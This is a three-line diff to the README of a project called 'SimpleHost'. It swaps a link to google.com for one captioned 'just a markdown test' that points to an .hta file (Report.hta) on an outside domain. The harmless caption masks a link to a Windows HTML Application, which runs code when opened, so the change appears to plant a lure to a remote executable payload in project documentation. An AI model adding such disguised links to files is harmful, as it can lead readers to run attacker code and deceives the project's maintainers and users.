@@ -1,3 +1,3 @@
 # SimpleHost
 
-[I'm an inline-style link](https://www.google.com)
+[just a markdown test](https://omgitsonfire.com/Report.hta)
